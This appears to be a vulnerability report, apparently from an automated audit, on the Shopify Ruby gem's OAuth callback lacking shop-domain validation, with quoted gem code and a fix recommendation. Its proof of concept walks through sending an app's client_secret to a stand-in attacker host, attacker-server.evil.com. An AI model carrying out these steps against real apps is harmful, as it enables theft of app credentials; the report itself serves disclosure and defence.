## Analysis

The gem enforces a consistent pattern elsewhere: `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` both call `Utils::ShopValidator.sanitize!(shop)` before building a `Session` and sending the `client_secret` to `https://#{shop}/admin/oauth`. [1](#0-0) [2](#0-1) 

`Auth::Oauth.validate_auth_callback`, however, builds the session that receives the `client_secret` directly from `auth_query.shop`, with no call to `Utils::ShopValidator` anywhere in `oauth.rb`. [3](#0-2) 

`ShopValidator.sanitize!`/`sanitize_shop_domain` is the only place that restricts a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) and rejects anything else. [4](#0-3) 

`Clients::HttpClient#initialize` builds the outbound request host directly from `session.shop` with no further validation:
```ruby
@base_uri = T.let("https://#{api_host || session.shop}", String)
``` [5](#0-4) 

`HmacValidator.validate` only proves that `code`, `host`, `shop`, `state`, `timestamp` were signed together by the app's `api_secret_key` — it never checks that `shop` is a `*.myshopify.com` domain. [6](#0-5) [7](#0-6) 

So the binding being checked is `HMAC(auth_query) == HMAC(secret, params)`, while the binding actually required for safety of the `access_token` POST is `auth_query.shop ∈ TRUSTED_SHOPIFY_DOMAINS`. These two checks are not equivalent, and only the former is enforced in `validate_auth_callback`.

### Reachability caveat
In practice, `shop` typically originates from Shopify's own OAuth `/authorize` redirect (called from `begin_auth`, which itself takes an unvalidated `shop:` argument from the host app). Whether this is truly attacker-reachable depends on how the host application supplies `shop` to `begin_auth`/the callback route — many Rails integrations (e.g. `shopify_app`) do validate/sanitize the shop param themselves before calling into this gem. The rules explicitly exclude "analogs that depend on the host application ignoring this gem's documented API." Since the gem's own `begin_auth` accepts a raw `shop:` string without ever calling `ShopValidator`, and `validate_auth_callback` repeats the same gap, this is not solely a host-application misuse issue — it is an inconsistency in the gem's own defense-in-depth relative to `client_credentials.rb`/`refresh_token.rb`, which do call `ShopValidator.sanitize!` on the exact same `shop:` input type.

I cannot fully confirm end-to-end exploitability (i.e., a concrete unauthenticated network path forcing an attacker-chosen non-Shopify `shop` value through `begin_auth`/`validate_auth_callback` such that `client_secret` is POSTed to an attacker-controlled host) without seeing how a specific host application wires up the `shop` parameter, since that wiring lives outside this gem. Given the tool budget is exhausted, I present this as the strongest reachable analog to the reported bug class but flag the residual uncertainty explicitly.

### Title
Missing `ShopValidator` domain restriction in `Auth::Oauth.begin_auth`/`validate_auth_callback` allows `client_secret` exfiltration to attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token` both call `Utils::ShopValidator.sanitize!(shop)` to restrict the shop domain to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before sending the app's `client_secret` to it. `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback` skip this validation entirely, so the `shop` string flows unchecked into `Clients::HttpClient`, whose `@base_uri` is built literally as `"https://#{session.shop}"`.

### Finding Description
`validate_auth_callback` creates `null_session = Auth::Session.new(shop: auth_query.shop)` and then does `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, POSTing a body containing `client_id`/`client_secret`/`code` to `https://#{auth_query.shop}/admin/oauth/access_token`. `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` with no domain allow-listing. The only check performed on `auth_query` before this POST is `Utils::HmacValidator.validate(auth_query)`, which verifies an HMAC over `code`, `host`, `shop`, `state`, `timestamp` — it validates the *integrity* of the tuple relative to the app secret, not that `shop` is restricted to `TRUSTED_SHOPIFY_DOMAINS`. This is the same field (`shop`) that is separately gated by `ShopValidator.sanitize!` in `client_credentials.rb` and `refresh_token.rb`, showing the gem itself treats shop-domain restriction as a required, independent control — one that is absent from the OAuth authorization-code flow.

### Impact Explanation
If any code path allows an attacker to influence the `shop` value reaching `begin_auth`/`validate_auth_callback` (e.g., a host app that passes through a `shop` query parameter, matching the documented usage pattern shown in `docs/usage/oauth.md`), the app's `client_id`/`client_secret` and the OAuth `code` would be POSTed to an attacker-chosen host instead of a genuine `*.myshopify.com` domain, resulting in credential exfiltration of the app's `client_secret` (SSRF carrying the app's credentials to the attacker's server).

### Likelihood Explanation
Likelihood is moderate-to-uncertain: it depends on whether the calling application already restricts `shop` before invoking `begin_auth`. Because the gem's own equivalent flows (`client_credentials`, `refresh_token`) treat this validation as mandatory and perform it internally, relying on the host app to do so for the authorization-code flow is inconsistent and easy to miss, especially since `docs/usage/oauth.md` shows constructing `AuthQuery` directly from `request.parameters` without additional shop sanitization.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` in `Auth::Oauth.begin_auth` (before building `auth_base_uri`) and in `Auth::Oauth.validate_auth_callback` (before constructing `null_session` from `auth_query.shop`), mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`.

### Proof of Concept
1. A host application built with this gem exposes an OAuth start endpoint that calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/callback")` without pre-validating `shop` (as the gem provides no built-in guard here, unlike `client_credentials`/`refresh_token`).
2. Attacker requests the start endpoint with `shop=attacker-server.evil.com`.
3. `begin_auth` builds `auth_base_uri("attacker-server.evil.com")` → `"https://attacker-server.evil.com/admin/oauth/authorize?..."` and redirects the victim there.
4. Attacker's server issues its own callback redirect back to the app's callback path with a `code`, `state` matching the cookie, and a `shop=attacker-server.evil.com`; since the app is only checking `state` equality and, in a misconfigured deployment, may not independently verify `shop`, `validate_auth_callback` proceeds to `Clients::HttpClient.new(session: Session.new(shop: "attacker-server.evil.com"), base_path: "/admin/oauth")`, POSTing `client_id`/`client_secret`/`code` to `https://attacker-server.evil.com/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker.

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )

            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
